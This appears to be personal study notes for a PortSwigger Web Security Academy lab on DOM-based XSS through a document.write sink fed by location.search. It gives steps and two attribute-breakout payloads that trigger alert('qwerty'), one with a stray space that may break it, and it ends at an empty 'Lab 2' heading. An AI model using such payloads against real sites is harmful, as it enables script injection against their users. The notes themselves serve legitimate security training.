## Lab 1: [DOM XSS in document.write sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
- Search for Any Random String > Inspect in Firefox (better) > Find the Searched String

![image](https://github.com/user-attachments/assets/1e9f6014-208e-4b8f-a1ce-db9fa2c1e7bf)

- Inspect the query > the Query is directly passing by Document.write() to DOM via <img> tag.
- Injection: `" onload="alert("qwerty")">` in search section
- <img src="/resources/images/tracker.gif?searchTerms=`" onload="alert("qwerty")">`
-
- OR
-
- Injection: `">< svg onload="alert("qwerty")>` in search section
- <img src="/resources/images/tracker.gif?searchTerms=`">< svg onload="alert("qwerty")>`

## Lab 2:

